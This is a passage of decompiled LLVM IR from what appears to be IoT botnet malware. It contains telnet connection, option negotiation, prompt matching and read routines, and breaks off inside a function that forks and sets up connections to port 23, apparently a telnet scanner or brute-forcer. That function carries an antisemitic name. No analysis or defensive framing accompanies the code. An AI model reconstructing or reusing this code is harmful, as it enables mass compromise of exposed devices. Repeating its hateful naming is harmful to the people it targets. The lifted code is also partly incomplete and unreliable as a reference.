  %v3_805209c = call i32 @strcasestr(i8* %v2_805209c, i32 %v2_8052090)
  %v1_80520a1 = icmp eq i32 %v3_805209c, 0
  br i1 %v1_80520a1, label %dec_label_pc_80520ae, label %dec_label_pc_80520c0

dec_label_pc_80520ae:                             ; preds = %dec_label_pc_8052087
  %v4_80520ae = add nuw nsw i32 %storemerge118, 1
  %v5_80520b7 = icmp slt i32 %v4_80520ae, %v4_805206c
  br i1 %v5_80520b7, label %dec_label_pc_8052087, label %dec_label_pc_80520c0

dec_label_pc_80520c0:                             ; preds = %dec_label_pc_8052087, %dec_label_pc_80520ae, %dec_label_pc_80520b1.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_80520b1.preheader ], [ 0, %dec_label_pc_80520ae ], [ 1, %dec_label_pc_8052087 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80520ae, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_805206c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80520c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052087, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_80520e5 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80520ed = or i32 %v3_80520e5, 2048
  %v3_8052109 = call i32 @fcntl(i32 %arg1, i32 4, i32 %v4_80520ed)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_805211d = trunc i32 %arg3 to i16
  %v2_805211d = call i32 @htons(i16 %v1_805211d)
  store i32 %arg2, i32* @edx, align 4
  %v3_8052139 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_805213e = icmp eq i32 %v3_8052139, 0
  br i1 %v1_805213e, label %dec_label_pc_8052151, label %dec_label_pc_80522cc

dec_label_pc_8052151:                             ; preds = %entry
  %v2_805212c = ptrtoint i32* %stack_var_-40 to i32
  %v3_805216a = bitcast i32* %stack_var_-32 to i8*
  %v4_805216a = call i32 @__GI_memset(i8* %v3_805216a, i32 0, i32 8)
  %v3_8052184 = call i32 @connect(i32 %arg1, i32 %v2_805212c, i32 16)
  %v5_805218c = icmp slt i32 %v3_8052184, 0
  %v1_8052190 = icmp eq i1 %v5_805218c, false
  br i1 %v1_8052190, label %dec_label_pc_8052283, label %dec_label_pc_8052196

dec_label_pc_8052196:                             ; preds = %dec_label_pc_8052151
  %v1_8052196 = call i32 @__errno_location(i32 %v3_8052184)
  %v1_805219b = inttoptr i32 %v1_8052196 to i32*
  %v2_805219b = load i32, i32* %v1_805219b, align 4
  %v9_805219d = icmp eq i32 %v2_805219b, 115
  %v1_80521a0 = icmp eq i1 %v9_805219d, false
  br i1 %v1_80521a0, label %dec_label_pc_80522cc, label %dec_label_pc_80521a6

dec_label_pc_80521a6:                             ; preds = %dec_label_pc_8052196
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_80521c3 = ptrtoint i32* %stack_var_-168 to i32
  %tmp26 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80521c3, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80521ca = call i8* @_memset(i8* %tmp26, i32 0, i32 32)
  %v2_80521d7 = udiv i32 %arg1, 32
  %v1_80521dd = urem i32 %arg1, 32
  %v0_80521e0 = load i32, i32* @ebp, align 4
  %v2_80521e0 = mul nuw nsw i32 %v2_80521d7, 4
  %v3_80521e0 = add nsw i32 %v2_80521e0, -164
  %v4_80521e0 = add i32 %v3_80521e0, %v0_80521e0
  %v5_80521e0 = inttoptr i32 %v4_80521e0 to i32*
  %v6_80521e0 = load i32, i32* %v5_80521e0, align 4
  %v9_80521e0 = shl i32 1, %v1_80521dd
  %v12_80521e0 = or i32 %v6_80521e0, %v9_80521e0
  store i32 %v12_80521e0, i32* %v5_80521e0, align 4
  %v1_80521eb = add i32 %arg1, 1
  %v2_80521ec = ptrtoint i32* %stack_var_-176 to i32
  %v5_8052213 = call i32 @__libc_select(i32 %v1_80521eb, i32 0, i32 %v2_80521c3, i32 0, i32 %v2_80521ec)
  %tmp27 = icmp slt i32 %v5_8052213, 1
  br i1 %tmp27, label %dec_label_pc_80522cc, label %dec_label_pc_805221c

dec_label_pc_805221c:                             ; preds = %dec_label_pc_80521a6
  %v5_8052250 = call i32 @getsockopt(i32 %arg1)
  %v1_805225b = icmp eq i32 %tmp16, 0
  br i1 %v1_805225b, label %dec_label_pc_8052283, label %dec_label_pc_80522cc

dec_label_pc_8052283:                             ; preds = %dec_label_pc_805221c, %dec_label_pc_8052151
  %v3_8052299 = call i32 @fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80522a1 = and i32 %v3_8052299, -2049
  %v3_80522bd = call i32 @fcntl(i32 %arg1, i32 4, i32 %v4_80522a1)
  br label %dec_label_pc_80522cc

dec_label_pc_80522cc:                             ; preds = %dec_label_pc_8052196, %dec_label_pc_80521a6, %dec_label_pc_805221c, %entry, %dec_label_pc_8052283
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_8052283 ], [ 0, %entry ], [ 0, %dec_label_pc_805221c ], [ 0, %dec_label_pc_80521a6 ], [ 0, %dec_label_pc_8052196 ]
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80522cc, { 4, 2, 1, 0, 3 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80522db = load i32, i32* @ebp, align 4
  store i32 %v0_80522db, i32* %stack_var_-4, align 4
  %v4_80522db = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80522db, i32* @ebp, align 4
  %v1_80522e4 = add i32 %arg2, 1
  %v1_80522e5 = inttoptr i32 %v1_80522e4 to i8*
  %v2_80522e5 = load i8, i8* %v1_80522e5, align 1
  %v9_80522ee = icmp ult i8 %v2_80522e5, -5
  br i1 %v9_80522ee, label %dec_label_pc_80523f9, label %dec_label_pc_80522fb

dec_label_pc_80522fb:                             ; preds = %entry
  %v7_8052302 = icmp eq i8 %v2_80522e5, -1
  br i1 %v7_8052302, label %dec_label_pc_8052304, label %dec_label_pc_805231e

dec_label_pc_8052304:                             ; preds = %dec_label_pc_80522fb
  br label %dec_label_pc_80523f9

dec_label_pc_805231e:                             ; preds = %dec_label_pc_80522fb
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_8052332 = ptrtoint i8* %stack_var_-5 to i32
  %v4_805233f = call i32 @send(i32 %arg1, i32 %v2_8052332, i32 1, i32 16384)
  %v2_8052348 = load i8, i8* %v1_80522e5, align 1
  %v11_805234b = icmp eq i8 %v2_8052348, -4
  %v1_805234d = icmp eq i1 %v11_805234b, false
  br i1 %v1_805234d, label %dec_label_pc_8052355, label %dec_label_pc_805234f

dec_label_pc_805234f:                             ; preds = %dec_label_pc_805231e
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80523ab

dec_label_pc_8052355:                             ; preds = %dec_label_pc_805231e
  %v2_8052359 = load i8, i8* %v1_80522e5, align 1
  %v11_805235c = icmp eq i8 %v2_8052359, -2
  %v1_805235e = icmp eq i1 %v11_805235c, false
  br i1 %v1_805235e, label %dec_label_pc_8052366, label %dec_label_pc_8052360

dec_label_pc_8052360:                             ; preds = %dec_label_pc_8052355
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80523ab

dec_label_pc_8052366:                             ; preds = %dec_label_pc_8052355
  %v2_805236a = load i8, i8* %v1_80522e5, align 1
  %v10_805236d = icmp eq i8 %v2_805236a, 3
  %v1_805236f = icmp eq i1 %v10_805236d, false
  %v11_8052396 = icmp eq i8 %v2_805236a, -3
  %v1_8052398 = icmp eq i1 %v11_8052396, false
  br i1 %v1_805236f, label %dec_label_pc_805238f, label %dec_label_pc_8052371

dec_label_pc_8052371:                             ; preds = %dec_label_pc_8052366
  %. = select i1 %v1_8052398, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_80523ab

dec_label_pc_805238f:                             ; preds = %dec_label_pc_8052366
  %.3 = select i1 %v1_8052398, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80523ab

dec_label_pc_80523ab:                             ; preds = %dec_label_pc_8052371, %dec_label_pc_8052360, %dec_label_pc_805234f, %dec_label_pc_805238f
  %v4_80523c8 = call i32 @send(i32 %arg1, i32 %v2_8052332, i32 1, i32 16384)
  %v1_80523d0 = add i32 %arg2, 2
  %v4_80523ed = call i32 @send(i32 %arg1, i32 %v1_80523d0, i32 1, i32 16384)
  %v2_80523fc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80523f9

dec_label_pc_80523f9:                             ; preds = %dec_label_pc_8052304, %dec_label_pc_80523ab, %entry
  %v2_80523fc = phi i32 [ %v0_80522db, %dec_label_pc_8052304 ], [ %v2_80523fc.pre, %dec_label_pc_80523ab ], [ %v0_80522db, %entry ]
  store i32 %v2_80523fc, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80523f9, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80523ab, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_805240c = ptrtoint i8* %arg1 to i32
  %v3_805241d = call i32 @_strlen(i8* %arg1)
  %v4_805241d = mul i32 %v3_805241d, -1
  %v1_8052423 = sub i32 0, %v4_805241d
  %v6_805244a = sub i32 %v4_805240c, %v4_805241d
  br label %dec_label_pc_80524d2

dec_label_pc_805243a:                             ; preds = %dec_label_pc_805248d, %dec_label_pc_8052475, %dec_label_pc_805245d, %dec_label_pc_8052445
  %v4_805243a = add nsw i32 %stack_var_-12.033, 1
  %v7_8052443 = icmp slt i32 %v4_805243a, %v1_8052423
  br i1 %v7_8052443, label %dec_label_pc_8052445, label %dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge

dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge: ; preds = %dec_label_pc_805243a, %dec_label_pc_805243d.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_805243d.preheader ], [ %v4_805243a, %dec_label_pc_805243a ]
  %.pre = sub i32 %v6_805244a, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80524a5

dec_label_pc_8052445:                             ; preds = %dec_label_pc_805243d.preheader, %dec_label_pc_805243a
  %stack_var_-12.033 = phi i32 [ %v4_805243a, %dec_label_pc_805243a ], [ %stack_var_-12.1, %dec_label_pc_805243d.preheader ]
  %v2_8052452 = sub i32 %v6_805244a, %stack_var_-12.033
  %v1_8052456 = inttoptr i32 %v2_8052452 to i8*
  %v2_8052456 = load i8, i8* %v1_8052456, align 1
  %v4_8052459 = icmp eq i8 %v2_8052456, 0
  br i1 %v4_8052459, label %dec_label_pc_805243a, label %dec_label_pc_805245d

dec_label_pc_805245d:                             ; preds = %dec_label_pc_8052445
  %v2_805246e = load i8, i8* %v1_8052456, align 1
  %v7_8052471 = icmp eq i8 %v2_805246e, 32
  br i1 %v7_8052471, label %dec_label_pc_805243a, label %dec_label_pc_8052475

dec_label_pc_8052475:                             ; preds = %dec_label_pc_805245d
  %v2_8052486 = load i8, i8* %v1_8052456, align 1
  %v10_8052489 = icmp eq i8 %v2_8052486, 13
  br i1 %v10_8052489, label %dec_label_pc_805243a, label %dec_label_pc_805248d

dec_label_pc_805248d:                             ; preds = %dec_label_pc_8052475
  %v2_805249e = load i8, i8* %v1_8052456, align 1
  %v10_80524a1 = icmp eq i8 %v2_805249e, 10
  br i1 %v10_80524a1, label %dec_label_pc_805243a, label %dec_label_pc_80524a5

dec_label_pc_80524a5:                             ; preds = %dec_label_pc_805248d, %dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge ], [ %stack_var_-12.033, %dec_label_pc_805248d ]
  %v1_80524b6.pre-phi = phi i8* [ %.pre10, %dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge ], [ %v1_8052456, %dec_label_pc_805248d ]
  %v2_80524b6 = load i8, i8* %v1_80524b6.pre-phi, align 1
  %v6_80524bc = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_806b16c.269 to i32)
  %v1_80524bf = inttoptr i32 %v6_80524bc to i8*
  %v2_80524bf = load i8, i8* %v1_80524bf, align 1
  %v15_80524c2 = icmp eq i8 %v2_80524b6, %v2_80524bf
  %v1_80524c4 = icmp eq i1 %v15_80524c2, false
  br i1 %v1_80524c4, label %dec_label_pc_80524cf, label %dec_label_pc_80524fc

dec_label_pc_80524cf:                             ; preds = %dec_label_pc_80524a5
  %v4_80524cf = add i32 %storemerge3, 1
  br label %dec_label_pc_80524d2

dec_label_pc_80524d2:                             ; preds = %entry, %dec_label_pc_80524cf
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.023, %dec_label_pc_80524cf ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_80524cf, %dec_label_pc_80524cf ]
  %v3_80524e6 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806b16c.269, i32 0, i32 0))
  %v7_80524ed = icmp ult i32 %storemerge3, %v3_80524e6
  br i1 %v7_80524ed, label %dec_label_pc_805243d.preheader, label %dec_label_pc_80524fc

dec_label_pc_805243d.preheader:                   ; preds = %dec_label_pc_80524d2
  %v7_805244332 = icmp slt i32 %stack_var_-12.1, %v1_8052423
  br i1 %v7_805244332, label %dec_label_pc_8052445, label %dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge

dec_label_pc_80524fc:                             ; preds = %dec_label_pc_80524d2, %dec_label_pc_80524a5
  %storemerge = phi i32 [ 1, %dec_label_pc_80524a5 ], [ 0, %dec_label_pc_80524d2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_805244a, { 1, 0 }
  uselistorder [6 x i8]* @global_var_806b16c.269, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80524d2, { 1, 0 }
  uselistorder label %dec_label_pc_805243d.dec_label_pc_80524a5_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_805254b = ptrtoint i32* %stack_var_-160 to i32
  %tmp27 = bitcast i32* %stack_var_-160 to i8*
  %v1_8052565 = urem i32 %arg1, 32
  %v9_8052568 = shl i32 1, %v1_8052565
  %v1_8052573 = add i32 %arg1, 1
  %v2_8052574 = ptrtoint i32* %stack_var_-168 to i32
  %v5_80525ab = ptrtoint i8* %arg6 to i32
  %v2_805267f = inttoptr i32 %arg2 to i8*
  %v4_8052688 = icmp eq i32 %arg3, 0
  %v1_80526a934 = add i32 %arg8, 2
  %v5_80526af43 = icmp slt i32 %v1_80526a934, %arg7
  br i1 %v5_80526af43, label %dec_label_pc_80526b1.lr.ph, label %dec_label_pc_80526cd

dec_label_pc_80526b1.lr.ph:                       ; preds = %entry
  %v2_805255f = udiv i32 %arg1, 32
  %v2_8052568 = mul nuw nsw i32 %v2_805255f, 4
  %v3_8052568 = add nsw i32 %v2_8052568, -156
  %tmp31 = icmp slt i32 %arg5, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br label %dec_label_pc_80526b1

dec_label_pc_8052541:                             ; preds = %dec_label_pc_80526bf, %dec_label_pc_80526b1
  store i32 %v2_805254b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8052552 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_8052568 = load i32, i32* @ebp, align 4
  %v4_8052568 = add i32 %v3_8052568, %v0_8052568
  %v5_8052568 = inttoptr i32 %v4_8052568 to i32*
  %v6_8052568 = load i32, i32* %v5_8052568, align 4
  %v12_8052568 = or i32 %v6_8052568, %v9_8052568
  store i32 %v12_8052568, i32* %v5_8052568, align 4
  %v5_805259b = call i32 @__libc_select(i32 %v1_8052573, i32 %v2_805254b, i32 0, i32 0, i32 %v2_8052574)
  %tmp28 = icmp slt i32 %v5_805259b, 1
  br i1 %tmp28, label %dec_label_pc_80526cd, label %dec_label_pc_80525a8

dec_label_pc_80525a8:                             ; preds = %dec_label_pc_8052541
  %v6_80525ab = add i32 %stack_var_-32.044, %v5_80525ab
  %v5_80525ae = inttoptr i32 %v6_80525ab to i8*
  %v4_80525ce = call i32 @recv(i32 %arg1, i32 %v6_80525ab, i32 1, i32 0)
  %v13_80525d6 = icmp eq i32 %v4_80525ce, -1
  br i1 %v13_80525d6, label %dec_label_pc_80526e9, label %dec_label_pc_80525dc

dec_label_pc_80525dc:                             ; preds = %dec_label_pc_80525a8
  %v4_80525dc = icmp eq i32 %v4_80525ce, 0
  %v1_80525e0 = icmp eq i1 %v4_80525dc, false
  br i1 %v1_80525e0, label %dec_label_pc_80525f1, label %dec_label_pc_80526e9

dec_label_pc_80525f1:                             ; preds = %dec_label_pc_80525dc
  %v5_80525f4 = add i32 %v4_80525ce, %stack_var_-32.044
  %v2_80525fa = load i8, i8* %v5_80525ae, align 1
  %v11_80525fd = icmp eq i8 %v2_80525fa, -1
  %v1_80525ff = icmp eq i1 %v11_80525fd, false
  br i1 %v1_80525ff, label %dec_label_pc_8052672, label %dec_label_pc_8052601

dec_label_pc_8052601:                             ; preds = %dec_label_pc_80525f1
  %v1_8052604 = add i32 %v6_80525ab, 1
  %v4_805261f = call i32 @recv(i32 %arg1, i32 %v1_8052604, i32 2, i32 0)
  %v13_8052627 = icmp eq i32 %v4_805261f, -1
  br i1 %v13_8052627, label %dec_label_pc_80526e9, label %dec_label_pc_805262d

dec_label_pc_805262d:                             ; preds = %dec_label_pc_8052601
  %v4_805262d = icmp eq i32 %v4_805261f, 0
  %v1_8052631 = icmp eq i1 %v4_805262d, false
  br i1 %v1_8052631, label %dec_label_pc_8052642, label %dec_label_pc_80526e9

dec_label_pc_8052642:                             ; preds = %dec_label_pc_805262d
  %v5_8052645 = add i32 %v4_805261f, %v5_80525f4
  %v3_805265d = call i32 @negotiate(i32 %arg1, i32 %v6_80525ab, i32 3)
  %v1_8052662 = icmp eq i32 %v3_805265d, 0
  %v1_8052664 = icmp eq i1 %v1_8052662, false
  br i1 %v1_8052664, label %dec_label_pc_80526a6.backedge, label %dec_label_pc_80526e9

dec_label_pc_80526a6.backedge:                    ; preds = %dec_label_pc_8052642, %dec_label_pc_8052688, %dec_label_pc_805268e
  %stack_var_-32.0.be = phi i32 [ %v5_80525f4, %dec_label_pc_8052688 ], [ %v5_80525f4, %dec_label_pc_805268e ], [ %v5_8052645, %dec_label_pc_8052642 ]
  %v1_80526a9 = add i32 %stack_var_-32.0.be, 2
  %v5_80526af = icmp slt i32 %v1_80526a9, %arg7
  br i1 %v5_80526af, label %dec_label_pc_80526a6.backedge.dec_label_pc_80526b1_crit_edge, label %dec_label_pc_80526cd

dec_label_pc_80526a6.backedge.dec_label_pc_80526b1_crit_edge: ; preds = %dec_label_pc_80526a6.backedge
  %v3_80526b1.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_80526b1

dec_label_pc_8052672:                             ; preds = %dec_label_pc_80525f1
  %v3_805267f = call i32 @strstr(i32 %v5_80525ab, i8* %v2_805267f)
  %v1_8052684 = icmp eq i32 %v3_805267f, 0
  %v1_8052686 = icmp eq i1 %v1_8052684, false
  br i1 %v1_8052686, label %dec_label_pc_80526cd, label %dec_label_pc_8052688

dec_label_pc_8052688:                             ; preds = %dec_label_pc_8052672
  br i1 %v4_8052688, label %dec_label_pc_80526a6.backedge, label %dec_label_pc_805268e

dec_label_pc_805268e:                             ; preds = %dec_label_pc_8052688
  %v2_8052694 = call i32 @matchPrompt(i8* %arg6)
  %v1_8052699 = icmp eq i32 %v2_8052694, 0
  br i1 %v1_8052699, label %dec_label_pc_80526a6.backedge, label %dec_label_pc_80526cd

dec_label_pc_80526b1:                             ; preds = %dec_label_pc_80526a6.backedge.dec_label_pc_80526b1_crit_edge, %dec_label_pc_80526b1.lr.ph
  %v3_80526b1 = phi i32 [ %arg4, %dec_label_pc_80526b1.lr.ph ], [ %v3_80526b1.pre, %dec_label_pc_80526a6.backedge.dec_label_pc_80526b1_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_80526b1.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_80526a6.backedge.dec_label_pc_80526b1_crit_edge ]
  %tmp29 = icmp slt i32 %v3_80526b1, 1
  %tmp30 = icmp eq i1 %tmp29, false
  br i1 %tmp30, label %dec_label_pc_8052541, label %dec_label_pc_80526bf

dec_label_pc_80526bf:                             ; preds = %dec_label_pc_80526b1
  br i1 %tmp32, label %dec_label_pc_8052541, label %dec_label_pc_80526cd

dec_label_pc_80526cd:                             ; preds = %dec_label_pc_8052541, %dec_label_pc_80526bf, %dec_label_pc_80526a6.backedge, %dec_label_pc_805268e, %dec_label_pc_8052672, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8052672 ], [ 1, %dec_label_pc_805268e ], [ 0, %dec_label_pc_80526a6.backedge ], [ 0, %dec_label_pc_80526bf ], [ 0, %dec_label_pc_8052541 ]
  br label %dec_label_pc_80526e9

dec_label_pc_80526e9:                             ; preds = %dec_label_pc_8052642, %dec_label_pc_8052601, %dec_label_pc_805262d, %dec_label_pc_80525a8, %dec_label_pc_80525dc, %dec_label_pc_80526cd
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80526cd ], [ 0, %dec_label_pc_80525dc ], [ 0, %dec_label_pc_80525a8 ], [ 0, %dec_label_pc_805262d ], [ 0, %dec_label_pc_8052601 ], [ 0, %dec_label_pc_8052642 ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_805261f, { 1, 2, 0 }
  uselistorder i32 %v4_80525ce, { 1, 2, 0 }
  uselistorder i32 %v5_80525ab, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80526e9, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_80526cd, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_80526a6.backedge, { 2, 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80526f8 = load i32, i32* @ebp, align 4
  store i32 %v0_80526f8, i32* %stack_var_-4, align 4
  %v4_80526f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80526f8, i32* @ebp, align 4
  %v4_80526fe = add i32 %arg1, -2
  %v9_80526fe = sub i32 1, %arg1
  %v10_80526fe = and i32 %v9_80526fe, %arg1
  %v11_80526fe = icmp slt i32 %v10_80526fe, 0
  %v12_80526fe = icmp eq i32 %v4_80526fe, 0
  %v13_80526fe = icmp slt i32 %v4_80526fe, 0
  %v3_8052702 = icmp eq i1 %v13_80526fe, %v11_80526fe
  %v4_8052702 = icmp eq i1 %v12_80526fe, false
  %v5_8052702 = and i1 %v4_8052702, %v3_8052702
  br i1 %v5_8052702, label %dec_label_pc_805270d, label %dec_label_pc_805271f

dec_label_pc_805270d:                             ; preds = %entry
  %v1_8052713 = call i32 @close(i32 %arg1)
  br label %dec_label_pc_805271f

dec_label_pc_805271f:                             ; preds = %entry, %dec_label_pc_805270d
  %storemerge = phi i32 [ 0, %dec_label_pc_805270d ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80526fe, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805271f, { 1, 0 }
}

define i32 @BurnTheJews(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-608 = alloca i32, align 4
  %stack_var_-684 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052727 = load i32, i32* @edi, align 4
  %v0_8052728 = load i32, i32* @esi, align 4
  %v0_8052729 = load i32, i32* @ebx, align 4
  store i32 %v0_8052729, i32* %stack_var_-16, align 4
  %v15_805272a = ptrtoint i32* %stack_var_-684 to i32
  store i32 %v15_805272a, i32* %eax.global-to-local, align 4
  %v1_8052738 = call i32 @fork(i32 %v15_805272a)
  store i32 %v1_8052738, i32* %eax.global-to-local, align 4
  %v1_805273d = icmp eq i32 %v1_8052738, 0
  br i1 %v1_805273d, label %dec_label_pc_8053740, label %dec_label_pc_8052745

dec_label_pc_8052745:                             ; preds = %entry
  store i32 0, i32* %stack_var_-684, align 4
  %v2_805274c = call i32 @__GI_time(i32* null)
  store i32 %v2_805274c, i32* %eax.global-to-local, align 4
  store i32 %v2_805274c, i32* @ebx, align 4
  %v0_8052753 = load i32, i32* %stack_var_-684, align 4
  %v1_8052753 = call i32 @__libc_getpid(i32 %v0_8052753)
  store i32 %v1_8052753, i32* %eax.global-to-local, align 4
  %v0_8052758 = load i32, i32* @ebx, align 4
  %v2_8052758 = xor i32 %v0_8052758, %v1_8052753
  store i32 %v2_8052758, i32* @ebx, align 4
  %v0_805275a = load i32, i32* %stack_var_-684, align 4
  %v1_805275a = call i32 @getppid(i32 %v0_805275a)
  %v0_805275f = load i32, i32* @ebx, align 4
  %v2_805275f = add i32 %v0_805275f, %v1_805275a
  store i32 %v2_805275f, i32* %eax.global-to-local, align 4
  store i32 %v2_805275f, i32* %stack_var_-684, align 4
  %v1_8052765 = call i32 @srand(i32 %v2_805275f)
  store i32 %v1_8052765, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-684, align 4
  %v2_8052771 = call i32 @__GI_time(i32* null)
  store i32 %v2_8052771, i32* %eax.global-to-local, align 4
  store i32 %v2_8052771, i32* @ebx, align 4
  %v0_8052778 = load i32, i32* %stack_var_-684, align 4
  %v1_8052778 = call i32 @__libc_getpid(i32 %v0_8052778)
  %v1_805277d = load i32, i32* @ebx, align 4
  %v2_805277d = xor i32 %v1_805277d, %v1_8052778
  store i32 %v2_805277d, i32* %eax.global-to-local, align 4
  store i32 %v2_805277d, i32* %stack_var_-684, align 4
  %v1_8052782 = call i32 @init_rand(i32 %v2_805277d)
  store i32 %v1_8052782, i32* %eax.global-to-local, align 4
  %v0_8052787 = load i32, i32* %stack_var_-684, align 4
  %v1_8052787 = call i32 @getdtablesize(i32 %v0_8052787)
  %v1_805278c = add i32 %v1_8052787, -100
  %v7_8052798 = icmp sgt i32 %v1_805278c, %arg2
  br i1 %v7_8052798, label %dec_label_pc_805279a, label %dec_label_pc_80527a0

dec_label_pc_805279a:                             ; preds = %dec_label_pc_8052745
  br label %dec_label_pc_80527a0

dec_label_pc_80527a0:                             ; preds = %dec_label_pc_8052745, %dec_label_pc_805279a
  %stack_var_-56.0 = phi i32 [ %arg2, %dec_label_pc_805279a ], [ %v1_805278c, %dec_label_pc_8052745 ]
  %storemerge = phi i32 [ %arg2, %dec_label_pc_805279a ], [ %v1_805278c, %dec_label_pc_8052745 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-608, align 4
  store i32 23, i32* %stack_var_-684, align 4
  %v2_80527b0 = call i32 @htons(i16 23)
  %v2_80527cf = ptrtoint i32* %stack_var_-608 to i32
